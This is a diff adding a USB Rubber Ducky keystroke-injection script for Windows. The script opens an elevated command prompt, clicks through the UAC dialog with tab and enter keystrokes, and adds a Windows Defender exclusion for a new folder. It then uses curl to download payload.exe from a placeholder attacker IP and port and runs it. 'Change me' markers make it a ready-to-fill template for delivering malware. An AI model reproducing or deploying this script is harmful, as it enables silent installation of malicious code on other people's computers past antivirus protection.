@@ -1,0 +1,38 @@
+DUCKY_LANG US
+DELAY 2000
+GUI r 
+STRING cmd
+DELAY 300
+CTRL+SHIFT ENTER
+DELAY 300
+TAB
+DELAY 200
+TAB 
+DELAY 200
+TAB 
+ENTER
+DELAY 200
+STRING powershell
+DELAY 500
+ENTER
+STRING mkdir C:\<created folder of your choice> ### change me ###
+DELAY 100
+ENTER
+STRING Add-MpPreference -ExclusionPath 'C:\folder of your choice' ### change me ###
+ENTER
+DELAY 500
+STRING curl http://<---IP---->:<PORT>/payload.exe -o C:\folder_of_choice\created_payload.exe ### change me ###
+ENTER
+DELAY 500
+STRING cd C:\<created folder> 
+ENTER
+DELAY 200
+STRING .\payload.exe ### change to desired, compiled payload ###
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 100
+STRING exit
+DELAY 100
+ENTER
